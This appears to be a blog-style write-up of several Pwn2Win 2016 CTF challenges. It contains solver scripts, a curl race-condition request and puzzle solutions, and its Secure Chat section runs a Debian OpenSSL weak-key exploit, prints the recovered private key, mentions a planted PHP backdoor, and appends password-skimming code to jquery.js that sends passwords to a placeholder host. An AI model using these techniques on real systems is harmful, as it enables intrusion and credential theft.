+<li><span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-1-Frame" tabindex="0" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><msub><mi>x</mi><mi>n</mi></msub><mo>=</mo><msub><mi>x</mi><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mi>n</mi><mo>&amp;#x2212;</mo><mn>1</mn></mrow></msub><mo>+</mo><mi>d</mi></math>" role="presentation" style="position: relative;"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-1" role="math" style="width: 6.826em; display: inline-block;"><span style="display: inline-block; position: relative; width: 5.68em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(1.669em 1005.68em 2.815em -999.997em); top: -2.497em; left: 0.003em;"><span class="mrow" id="MathJax-Span-2"><span class="msubsup" id="MathJax-Span-3"><span style="display: inline-block; position: relative; width: 0.888em; height: 0px;"><span style="position: absolute; clip: rect(3.44em 1000.47em 4.169em -999.997em); top: -4.008em; left: 0.003em;"><span class="mi" id="MathJax-Span-4" style="font-family: STIXGeneral-Italic;">x<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span><span style="position: absolute; top: -3.852em; left: 0.471em;"><span class="mi" id="MathJax-Span-5" style="font-size: 70.7%; font-family: STIXGeneral-Italic;">n</span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span></span></span><span class="mo" id="MathJax-Span-6" style="font-family: STIXGeneral-Regular; padding-left: 0.315em;">=</span><span class="msubsup" id="MathJax-Span-7" style="padding-left: 0.315em;"><span style="display: inline-block; position: relative; width: 1.721em; height: 0px;"><span style="position: absolute; clip: rect(3.44em 1000.47em 4.169em -999.997em); top: -4.008em; left: 0.003em;"><span class="mi" id="MathJax-Span-8" style="font-family: STIXGeneral-Italic;">x<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span><span style="position: absolute; top: -3.852em; left: 0.471em;"><span class="texatom" id="MathJax-Span-9"><span class="mrow" id="MathJax-Span-10"><span class="mi" id="MathJax-Span-11" style="font-size: 70.7%; font-family: STIXGeneral-Italic;">n</span><span class="mo" id="MathJax-Span-12" style="font-size: 70.7%; font-family: STIXGeneral-Regular;">−</span><span class="mn" id="MathJax-Span-13" style="font-size: 70.7%; font-family: STIXGeneral-Regular;">1</span></span></span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span></span></span><span class="mo" id="MathJax-Span-14" style="font-family: STIXGeneral-Regular; padding-left: 0.263em;">+</span><span class="mi" id="MathJax-Span-15" style="font-family: STIXGeneral-Italic; padding-left: 0.263em;">d<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.055em;"></span></span></span><span style="display: inline-block; width: 0px; height: 2.503em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.247em; border-left-width: 0px; border-left-style: solid; width: 0px; height: 1.128em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>x</mi><mi>n</mi></msub><mo>=</mo><msub><mi>x</mi><mrow class="MJX-TeXAtom-ORD"><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>+</mo><mi>d</mi></math></span></span><script type="math/tex" id="MathJax-Element-1">x_n = x_{n-1}+d</script></span></li>
+<li><span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-2-Frame" tabindex="0" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><msub><mi>x</mi><mi>n</mi></msub><mo>=</mo><msub><mi>x</mi><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mi>n</mi><mo>&amp;#x2212;</mo><mn>1</mn></mrow></msub><mi>d</mi></math>" role="presentation" style="position: relative;"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-16" role="math" style="width: 5.419em; display: inline-block;"><span style="display: inline-block; position: relative; width: 4.482em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(1.669em 1004.48em 2.815em -999.997em); top: -2.497em; left: 0.003em;"><span class="mrow" id="MathJax-Span-17"><span class="msubsup" id="MathJax-Span-18"><span style="display: inline-block; position: relative; width: 0.888em; height: 0px;"><span style="position: absolute; clip: rect(3.44em 1000.47em 4.169em -999.997em); top: -4.008em; left: 0.003em;"><span class="mi" id="MathJax-Span-19" style="font-family: STIXGeneral-Italic;">x<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span><span style="position: absolute; top: -3.852em; left: 0.471em;"><span class="mi" id="MathJax-Span-20" style="font-size: 70.7%; font-family: STIXGeneral-Italic;">n</span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span></span></span><span class="mo" id="MathJax-Span-21" style="font-family: STIXGeneral-Regular; padding-left: 0.315em;">=</span><span class="msubsup" id="MathJax-Span-22" style="padding-left: 0.315em;"><span style="display: inline-block; position: relative; width: 1.721em; height: 0px;"><span style="position: absolute; clip: rect(3.44em 1000.47em 4.169em -999.997em); top: -4.008em; left: 0.003em;"><span class="mi" id="MathJax-Span-23" style="font-family: STIXGeneral-Italic;">x<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span><span style="position: absolute; top: -3.852em; left: 0.471em;"><span class="texatom" id="MathJax-Span-24"><span class="mrow" id="MathJax-Span-25"><span class="mi" id="MathJax-Span-26" style="font-size: 70.7%; font-family: STIXGeneral-Italic;">n</span><span class="mo" id="MathJax-Span-27" style="font-size: 70.7%; font-family: STIXGeneral-Regular;">−</span><span class="mn" id="MathJax-Span-28" style="font-size: 70.7%; font-family: STIXGeneral-Regular;">1</span></span></span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span></span></span><span class="mi" id="MathJax-Span-29" style="font-family: STIXGeneral-Italic;">d<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.055em;"></span></span></span><span style="display: inline-block; width: 0px; height: 2.503em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.247em; border-left-width: 0px; border-left-style: solid; width: 0px; height: 1.128em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>x</mi><mi>n</mi></msub><mo>=</mo><msub><mi>x</mi><mrow class="MJX-TeXAtom-ORD"><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mi>d</mi></math></span></span><script type="math/tex" id="MathJax-Element-2">x_n = x_{n-1} d</script></span></li>
+<li><span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-3-Frame" tabindex="0" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><msub><mi>x</mi><mi>n</mi></msub><mo>=</mo><msub><mi>x</mi><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mi>n</mi><mo>&amp;#x2212;</mo><mn>1</mn></mrow></msub><mo>+</mo><msub><mi>x</mi><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mi>n</mi><mo>&amp;#x2212;</mo><mn>2</mn></mrow></msub></math>" role="presentation" style="position: relative;"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-30" role="math" style="width: 8.284em; display: inline-block;"><span style="display: inline-block; position: relative; width: 6.878em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(1.773em 1006.88em 2.815em -999.997em); top: -2.497em; left: 0.003em;"><span class="mrow" id="MathJax-Span-31"><span class="msubsup" id="MathJax-Span-32"><span style="display: inline-block; position: relative; width: 0.888em; height: 0px;"><span style="position: absolute; clip: rect(3.44em 1000.47em 4.169em -999.997em); top: -4.008em; left: 0.003em;"><span class="mi" id="MathJax-Span-33" style="font-family: STIXGeneral-Italic;">x<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span><span style="position: absolute; top: -3.852em; left: 0.471em;"><span class="mi" id="MathJax-Span-34" style="font-size: 70.7%; font-family: STIXGeneral-Italic;">n</span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span></span></span><span class="mo" id="MathJax-Span-35" style="font-family: STIXGeneral-Regular; padding-left: 0.315em;">=</span><span class="msubsup" id="MathJax-Span-36" style="padding-left: 0.315em;"><span style="display: inline-block; position: relative; width: 1.721em; height: 0px;"><span style="position: absolute; clip: rect(3.44em 1000.47em 4.169em -999.997em); top: -4.008em; left: 0.003em;"><span class="mi" id="MathJax-Span-37" style="font-family: STIXGeneral-Italic;">x<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span><span style="position: absolute; top: -3.852em; left: 0.471em;"><span class="texatom" id="MathJax-Span-38"><span class="mrow" id="MathJax-Span-39"><span class="mi" id="MathJax-Span-40" style="font-size: 70.7%; font-family: STIXGeneral-Italic;">n</span><span class="mo" id="MathJax-Span-41" style="font-size: 70.7%; font-family: STIXGeneral-Regular;">−</span><span class="mn" id="MathJax-Span-42" style="font-size: 70.7%; font-family: STIXGeneral-Regular;">1</span></span></span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span></span></span><span class="mo" id="MathJax-Span-43" style="font-family: STIXGeneral-Regular; padding-left: 0.263em;">+</span><span class="msubsup" id="MathJax-Span-44" style="padding-left: 0.263em;"><span style="display: inline-block; position: relative; width: 1.721em; height: 0px;"><span style="position: absolute; clip: rect(3.44em 1000.47em 4.169em -999.997em); top: -4.008em; left: 0.003em;"><span class="mi" id="MathJax-Span-45" style="font-family: STIXGeneral-Italic;">x<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span><span style="position: absolute; top: -3.852em; left: 0.471em;"><span class="texatom" id="MathJax-Span-46"><span class="mrow" id="MathJax-Span-47"><span class="mi" id="MathJax-Span-48" style="font-size: 70.7%; font-family: STIXGeneral-Italic;">n</span><span class="mo" id="MathJax-Span-49" style="font-size: 70.7%; font-family: STIXGeneral-Regular;">−</span><span class="mn" id="MathJax-Span-50" style="font-size: 70.7%; font-family: STIXGeneral-Regular;">2</span></span></span><span style="display: inline-block; width: 0px; height: 4.013em;"></span></span></span></span></span><span style="display: inline-block; width: 0px; height: 2.503em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.247em; border-left-width: 0px; border-left-style: solid; width: 0px; height: 1.003em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>x</mi><mi>n</mi></msub><mo>=</mo><msub><mi>x</mi><mrow class="MJX-TeXAtom-ORD"><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>+</mo><msub><mi>x</mi><mrow class="MJX-TeXAtom-ORD"><mi>n</mi><mo>−</mo><mn>2</mn></mrow></msub></math></span></span><script type="math/tex" id="MathJax-Element-3">x_n = x_{n-1}+x_{n-2}</script></span></li>
+</ol><p>There was actually one more type of sequence which was unknown, however running solver script many times (~10 times?) gave me the flag.</p><pre><code class="python hljs"><div class="wrapper"><div class="gutter linenumber"><span data-linenumber="1"></span>
+<span data-linenumber="2"></span>
+<span data-linenumber="3"></span>
+<span data-linenumber="4"></span>
+<span data-linenumber="5"></span>
+<span data-linenumber="6"></span>
+<span data-linenumber="7"></span>
+<span data-linenumber="8"></span>
+<span data-linenumber="9"></span>
+<span data-linenumber="10"></span>
+<span data-linenumber="11"></span>
+<span data-linenumber="12"></span>
+<span data-linenumber="13"></span>
+<span data-linenumber="14"></span>
+<span data-linenumber="15"></span>
+<span data-linenumber="16"></span>
+<span data-linenumber="17"></span>
+<span data-linenumber="18"></span>
+<span data-linenumber="19"></span>
+<span data-linenumber="20"></span>
+<span data-linenumber="21"></span>
+<span data-linenumber="22"></span>
+<span data-linenumber="23"></span>
+<span data-linenumber="24"></span>
+<span data-linenumber="25"></span>
+<span data-linenumber="26"></span>
+<span data-linenumber="27"></span>
+<span data-linenumber="28"></span>
+<span data-linenumber="29"></span>
+<span data-linenumber="30"></span>
+<span data-linenumber="31"></span>
+<span data-linenumber="32"></span>
+<span data-linenumber="33"></span>
+<span data-linenumber="34"></span>
+<span data-linenumber="35"></span>
+<span data-linenumber="36"></span>
+<span data-linenumber="37"></span>
+<span data-linenumber="38"></span>
+<span data-linenumber="39"></span></div><div class="code"><span class="hljs-comment">#!/usr/bin/env python</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+r = remote(<span class="hljs-string">'pool.pwn2win.party'</span>, <span class="hljs-number">1337</span>)
+answer = []
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">15</span>):
+  line = r.recvline().strip()
+  <span class="hljs-keyword">print</span> line
+  seq = map(int, line.replace(<span class="hljs-string">'&gt;'</span>, <span class="hljs-string">''</span>).replace(<span class="hljs-string">' '</span>, <span class="hljs-string">''</span>).split(<span class="hljs-string">'-'</span>))
+  <span class="hljs-keyword">assert</span> len(seq) == <span class="hljs-number">4</span>
+  multiplier = seq[<span class="hljs-number">2</span>] / seq[<span class="hljs-number">1</span>]
+  adder = seq[<span class="hljs-number">2</span>] - seq[<span class="hljs-number">1</span>]
+  index = seq[<span class="hljs-number">0</span>]
+  <span class="hljs-keyword">if</span> seq[<span class="hljs-number">2</span>] * multiplier == seq[<span class="hljs-number">3</span>]:
+    <span class="hljs-keyword">print</span> <span class="hljs-string">'mul'</span>
+    ans = seq[<span class="hljs-number">1</span>] * (multiplier ** (index-<span class="hljs-number">1</span>))
+  <span class="hljs-keyword">elif</span> seq[<span class="hljs-number">2</span>] + adder == seq[<span class="hljs-number">3</span>]:
+    <span class="hljs-keyword">print</span> <span class="hljs-string">'add'</span>
+    ans = seq[<span class="hljs-number">1</span>] + adder * (index-<span class="hljs-number">1</span>)
+  <span class="hljs-keyword">elif</span> seq[<span class="hljs-number">1</span>] + seq[<span class="hljs-number">2</span>] == seq[<span class="hljs-number">3</span>]:
+    <span class="hljs-keyword">print</span> <span class="hljs-string">'fib'</span>
+    b1, b2 = seq[<span class="hljs-number">3</span>], seq[<span class="hljs-number">2</span>]
+    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">3</span>, index):
+      b1, b2 = b1+b2, b1
+    ans = b1
+  <span class="hljs-keyword">else</span>:
+    <span class="hljs-keyword">print</span> <span class="hljs-string">'unknown:'</span>
+    exit(<span class="hljs-number">0</span>)
+  <span class="hljs-keyword">print</span> <span class="hljs-string">'ans:'</span>, ans
+  answer.append(ans)
+
+<span class="hljs-keyword">assert</span> r.recvuntil(<span class="hljs-string">'Results? '</span>) == <span class="hljs-string">'Results? '</span>
+
+ans_str = <span class="hljs-string">','</span>.join(map(str, answer))
+<span class="hljs-keyword">print</span> <span class="hljs-string">'sending.. %s'</span> % ans_str
+r.sendline(ans_str)
+
+r.interactive()
+</div></div></code></pre><p>flag: <code>CTF-BR{Agor4_j4_pod3m0s_com3c4r_4_br1nc4r_d3_v3rd4d3-by_Skypitain82!\m/}</code></p><h3 id="sleeper-cell-rev-70">Sleeper cell - Rev 70<a class="header-link hidden-xs" href="#sleeper-cell-rev-70" title="sleeper-cell-rev-70"><span class="sr-only"></span><i class="fa fa-link"></i></a></h3><p>the program looks like:<br>
+<code>memcmp(encrypt(input), 'FYM-OI}olte_zi_wdqedd_djrzuj_shgmEDFqo{')</code><br>
+We set a breakpoint on memcpy and bruteforced every chars (by hand!) to find the flag.<br>
+flag: <code>CTF-BR{riot_in_public_square_vgzdLIEjd}</code></p><h3 id="v0t3-web-65">V0t3 - Web 65<a class="header-link hidden-xs" href="#v0t3-web-65" title="v0t3-web-65"><span class="sr-only"></span><i class="fa fa-link"></i></a></h3><p>race condition.<br>
+<code>curl 'http://v0t3.pwn2win.party/poll?field=No' &amp;; curl 'http://v0t3.pwn2win.party/results'</code><br>
+flag: <code>CTF-BR{w1n_th3_r4c3}</code></p><h3 id="d3lc1d10-steg-25">D3lc1d10 - Steg 25<a class="header-link hidden-xs" href="#d3lc1d10-steg-25" title="d3lc1d10-steg-25"><span class="sr-only"></span><i class="fa fa-link"></i></a></h3><p>emojicode.<br>
+tel: 3411-1221<br>
+<a href="https://www.ixigo.com/palacio-do-planalto-brasilia-brazil-ne-1754579" target="_blank">https://www.ixigo.com/palacio-do-planalto-brasilia-brazil-ne-1754579</a><br>
+flag: <code>CTF-BR{Palacio do Planalto, Praca dos Tres Poderes}</code></p><h3 id="secure-chat-web-100">Secure Chat - Web 100<a class="header-link hidden-xs" href="#secure-chat-web-100" title="secure-chat-web-100"><span class="sr-only"></span><i class="fa fa-link"></i></a></h3><p>The hint reminded me of CVE-2008-0166. Testing <a href="https://www.exploit-db.com/exploits/5720/" target="_blank">https://www.exploit-db.com/exploits/5720/</a> with username carleetos we figured out correct ssh private key.</p><pre><code>193s@mbp193s:~/CTF/m/pwn2win/web/securechat$ python 5720.py ./rsa/2048/ chat.pwn2win.party carleetos 22 100
+
+-OpenSSL Debian exploit- by ||WarCat team|| warcat.no-ip.org
+Tested 491 keys | Remaining 32277 keys | Aprox. Speed 98/sec
+Tested 910 keys | Remaining 31858 keys | Aprox. Speed 83/sec
+...
+Tested 16427 keys | Remaining 16341 keys | Aprox. Speed 12/sec
+
+Key Found in file: 7f97f0867b7db73c8801e46c735a8b85-14980
+Execute: ssh -lcarleetos -p22 -i ./rsa/2048//7f97f0867b7db73c8801e46c735a8b85-14980 chat.pwn2win.party
+</code></pre><pre><code>-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAr5co7Q/2plvAvSdc5ZMbOBUKVlaaULlo2lqjFlLgOlARL2pO
+YVvENzIRyaXCrHSD6cZfmE8MXaLBRSzMXwm7Z7gEajctPidFyA8b/cMEhX/SGicX
+Zx2nlDw0U1J3UCfYcQ+886KpfpMdJnov0noUrVr9c7Xc0we3711KReJAG7HH+fQn
+Qwemnn+IeA4WoFyihS5bX+oK2WquPAlKmUSoGYYohpCuw0xUZ08ZV/v/0zll4RwW
+hqUsA/+KRBOGrQd1sK+24zxTPkewSyAgjBJoAqQxoK+5HxF58hISMH6sf7Rpo+aR
+Cjy53vg3vS7S6UNnH6jTGHb8NrGbwb90CwBWtQIBIwKCAQBfUg7nF0thn4XjBr1m
+rvGE2DjPyJzp/kA8BVE4ARqjUAlUQQX6VmMz5/sHENdk7stEZF/HteIkM8gA+w/b
+0hVG7t3TQoZGT9Vsmnzo15S9f+cVgu9yfdAAA2zcxl4G8Q8Yzgd88eb7kbC9HcIw
+bih7XUfCeKsTeTf2+CEBXZCEDyZzf4jxIBfEZSKOr/Iw8nlvk/0d5XOJLTm65aRW
+2nunuogifYiZCC+Ajy9kIzygMHQKUvWKVNc6UUMOgunDhr9BcJyZ2QdqT2ct4XeK
+KBePcqU5wQzy1SHlkRo6hbl0lpvgD0YHMcVYVJ9oZtrGygGnLBLhE7FmkzZw3Dx9
+HkOLAoGBAObTRdEwWl7hRkHKhEXHwa+JntjIhSBUaCMkWPf3cOif0bbkikMpqRKP
+wopjlJIiSV0/Wi96yEEONSenH6A+7yBrprq16Zt7lZWueZk2Eb2NB/bIt7hjEv7U
+7xDGCVnq+FJeprWoQnj9vDBV0+USt/t/z2HZDeVQADcyx4k/2gkBAoGBAMK9te4F
+qA573UpjUy2m3EkuBaLZldJSa91hFsWWC2JtJvAfHyyaryA7kkUg/hj1pEBY2D2u
+ueU5hYjFlvRxtFNFwEd9tXQ0wYT3SpAvFSC+NNSWACxAChRAWxR36scOzxMUTCR9
+JU6c1gotxeGQxnYNlbpCerUpvSixmB0NFvm1AoGBANmioOnOgRehM50eB6+B0+AF
+aeJWqWegCmpG14q2Gf/nJNEDXcpL2ezt8fAyARwRsuLj9fJAkOzhgpMZ6p5nOTvT
+Ns1MbotIovrXtHqDb8/6ADHTMOEM9KcgiaIZzk13JKVvL3gTrGNy5KKaEO3tE95/
+0ikOetDlB4SAVbvrvvKLAoGBAJY6k6j9DJ11ftL8Kjko8xPhrJOR6JrvIAKMucuf
+omHfLKqbqlWb5i7O3o0Zc4+Y7GwnR7qOGmBfkuXaQUA6dSpLwDcmdgkwAwAse1lI
+5Gm3TVOJqFymbizhMFGeVgdF8DNKLBwmBtY+eTsNXiMJSKQ2XY+voH0gMtY/276j
+sqNfAoGALaRJEcADomRj2kFG863wRjz9elxVw4TlG6MqwO6iErgSD3hR99xRgM29
+Lm7b4y6bpebfROQlpe2uRbxPX6tYb1YiOqb3xT4HVA0eonCby5Y/ozGyI27NGDnG
+DSh3nh6hR/1yhCPE1RJXwbrRXMGRITk6oh1V861AffHpS8vwkXA=
+-----END RSA PRIVATE KEY-----
+</code></pre><pre><code>$ id
+uid=1000(carleetos) gid=1000(carleetos) groups=1000(carleetos)
+</code></pre><p>I put backdoor php file onto ./public_html to get shell of www-data.</p><pre><code>$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre><p>Two persons (carleetos, fideleeto) are chatting on this platform. As the challenge description said, what we have to do is to sniff the chat.</p><pre><code>-rw-r----- 1 root     www-data  4953 Jan 10 10:42 base64.js
+-rw-r----- 1 root     www-data  3210 Jan 10 10:42 bluewhite.css
+-rw-r----- 1 root     www-data 19841 Jan 10 10:42 curve25519.js
+drwxr-x--- 2 www-data www-data  4096 Mar 27 03:27 db
+-rw-r----- 1 root     www-data    74 Jan 10 10:42 db.sql.forbid
+-rw-r----- 1 root     www-data  2259 Jan 10 10:42 horde-power1.png
+-rw-r----- 1 root     www-data  7885 Jan 10 10:42 index.php
+-rw-rw---- 1 root     www-data 57254 Mar 27 03:21 jquery.js
+-rw-r--r-- 1 root     root     57254 Jan 16 20:14 jquery.js~
+-rw-r----- 1 root     www-data 45333 Jan 10 10:42 jscrypto.js
+-rw-r----- 1 root     www-data   505 Jan 10 10:42 locked.png
+-rw-r----- 1 root     www-data  1450 Jan 10 10:42 login.php
+-rw-r----- 1 root     www-data 10386 Jan 16 19:37 mailbox.php
+-rw-r----- 1 root     www-data 15828 Jan 10 10:42 screen.css
+-rw-r----- 1 root     www-data  7939 Jan 10 10:42 sha512.js
+-rw-r----- 1 root     www-data 25092 Jan 10 12:28 sjcl.js
+-rw-r----- 1 root     www-data   649 Jan 10 15:18 users
+</code></pre><p>We figured out that jquery.js was writable. Putting malicious code onto it, we got plain passwords for carleetos/fideleeto.</p><pre><code class="bash hljs"><span class="hljs-built_in">echo</span> <span class="hljs-string">'$.post = function(x){$.get("http://HOST/leak?"+$("#pass").val());};'</span> &gt;&gt; /var/www/html/webmail/jquery.js
+</code></pre><pre><code>45.55.151.27 - - [27/Mar/2016:17:00:04 +0900] "OPTIONS /leak?~]4mts-[gK*4C HTTP/1.1" 405 574 "https://127.0.0.1/webmail/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36"
+45.55.151.27 - - [27/Mar/2016:17:00:04 +0900] "OPTIONS /leak?%7CAAzg:-z-i@%7D9,=Cc%3Ce%5C HTTP/1.1" 405 574 "https://127.0.0.1/webmail/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36"
+</code></pre><p>The flag was found after logging in.</p><p><a href="http://i.imgur.com/ZJRe7VI.png" target="_blank"><img src="http://i.imgur.com/ZJRe7VI.png" alt=""></a></p><p>flag: <code>CTF-BR{+55(13)31485521}</code></p><h3 id="access-code-net-100">Access Code - Net 100<a class="header-link hidden-xs" href="#access-code-net-100" title="access-code-net-100"><span class="sr-only"></span><i class="fa fa-link"></i></a></h3><p>For this challenge you connect to a remote port and are given status updates as a process runs in the background.  While connected the server will connect back to you on port 1110/tcp and send a “control packet”. This packet will contain an operation (“xor” or “mod”) and an integer. e.g. "xor 221"<br>
+Stage 2 then begins, the server connects back to your IP on a random range of ports 100 - 500. Then asks you for the 'Code?'<br>
+If you take the TCP destination port of each of the random stage 2 packets, perform the control packet operation on the port numbers then concatenate the result such as:</p><p>Control Packet: mod 221<br>
+Ports: 201, 294, 295, 300<br>
+Result: 221737479</p><p>Prefix the result with “Code” and submit:<br>
+Response: Code221737479</p><p>You will then receive the flag.<br>
+flag: <code>CTF-BR{Authentication_H4rdc0r3_FTW}</code></p><h3 id="qrgrams-ppc-60">QRGrams - PPC 60<a class="header-link hidden-xs" href="#qrgrams-ppc-60" title="qrgrams-ppc-60"><span class="sr-only"></span><i class="fa fa-link"></i></a></h3><p>This was purely a programming challenge with straightforward solution. You connect to a server and receive a long string of QR codes in various formats and sizes and then are asked a “Phrase?”</p><p>Taking the QR codes, converting them into a computer recognizable format and then recovering the Phrase is the challenge here. Using python the QR code recovery is possible by converting the ASCII QR image into PNG you can then use a QR decoder tool on the PNG images. When you do you recover a “jumbled” phrase such as:</p><p>QR Code output: irPxa si tno botua ou,pmecsrt 'its uaotb el.pope 10 36</p><p>The unjumbled string would be: Pixar is not about computers, it’s about people.</p><p>There are two additional integers appended on the end also which we simply appended in order because we did not see the significance of those.</p><p>To solve this we took a word descrambling tool and an english dictionary. The challenge gave very little time to respond to the challenge so we could not manually verify the result in time. So instead, we looped the program until we received a phrase we could unjumble correctly.</p><p>The script submits the unjumbled phrase and we are awarded with the flag.<br>
+flag: <code>CTF-BR{QRgramas_are_the_new_wave_of_codes,_dude!}</code></p><h3 id="electronic-ballot-box-elet-50">Electronic Ballot Box - Elet 50<a class="header-link hidden-xs" href="#electronic-ballot-box-elet-50" title="electronic-ballot-box-elet-50"><span class="sr-only"></span><i class="fa fa-link"></i></a></h3><p>For this challenge we’re given 4 blurry JPGs of an electronic circuit comprising of various 7400 series logic chips. The diagram describes the type of logic chips and each’s inputs/output pins.</p><p>There is a C source code describing the controller logic that sets the pin values of the 7400 chips either low or high based on what two keys on a keypad a processVoter enters.</p><p>The Psuedocode of the program is as below:</p><pre><code class="python hljs">InitCircuit() {
+	setPinModetoOutput(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">22</span>,<span class="hljs-number">24</span>,<span class="hljs-number">26</span>,<span class="hljs-number">28</span>)
+	setPinModetoInput(<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">23</span>,<span class="hljs-number">25</span>,<span class="hljs-number">27</span>,<span class="hljs-number">29</span>)
+}
+
+mainLoop {
+
+	waitForKeypress {
+			<span class="hljs-keyword">if</span> twoKeysPressed {
+			
+				<span class="hljs-keyword">if</span> keysPressed(<span class="hljs-number">1</span>,<span class="hljs-number">3</span>) processprocessVote(<span class="hljs-string">'pt'</span>)
+				<span class="hljs-keyword">if</span> keysPressed(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>) processprocessVote(<span class="hljs-string">'pstu'</span>)
+				<span class="hljs-keyword">if</span> keysPressed(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>) processVote(<span class="hljs-string">'psc'</span>)
+				<span class="hljs-keyword">if</span> keysPressed(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>) processVote(<span class="hljs-string">'pcb'</span>)
+				<span class="hljs-keyword">if</span> keysPressed(<span class="hljs-number">2</span>,<span class="hljs-number">7</span>) processVote(<span class="hljs-string">'psdc'</span>)
+				<span class="hljs-keyword">if</span> keysPressed(<span class="hljs-number">2</span>,<span class="hljs-number">8</span>) processVote(<span class="hljs-string">'prtb'</span>)
+				<span class="hljs-keyword">if</span> keysPressed(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>) processVote(<span class="hljs-string">'pco'</span>)
+				<span class="hljs-keyword">if</span> keysPressed(<span class="hljs-number">4</span>,<span class="hljs-number">0</span>) processVote(<span class="hljs-string">'psb'</span>)
+				<span class="hljs-keyword">if</span> keysPressed(<span class="hljs-number">4</span>,<span class="hljs-number">3</span>) processVote(<span class="hljs-string">'pv'</span>)
+				<span class="hljs-keyword">if</span> keysPressed(<span class="hljs-number">4</span>,<span class="hljs-number">5</span>) processVote(<span class="hljs-string">'psdb'</span>)
+				<span class="hljs-keyword">if</span> keysPressed(<span class="hljs-number">5</span>,<span class="hljs-number">0</span>) processVote(<span class="hljs-string">'psol'</span>)
+			}
+		}
+
+}
+
+processVote(vote) {
+		<span class="hljs-keyword">if</span> vote == <span class="hljs-string">'pt'</span> 
+			setStatesHigh(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">24</span>,<span class="hljs-number">28</span>)
+			setStatesLow(<span class="hljs-number">8</span>,<span class="hljs-number">22</span>,<span class="hljs-number">26</span>)
+			readLogicOutputs
+			manipulateResultPins((<span class="hljs-number">23</span>,-<span class="hljs-number">1</span>), (<span class="hljs-number">27</span>,+<span class="hljs-number">1</span>), (<span class="hljs-number">29</span>,-<span class="hljs-number">1</span>))
+		<span class="hljs-keyword">if</span> vote == <span class="hljs-string">'pstu'</span> 
+			setStatesHigh(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">28</span>)
+			setStatesLow(<span class="hljs-number">8</span>,<span class="hljs-number">22</span>,<span class="hljs-number">24</span>,<span class="hljs-number">26</span>)
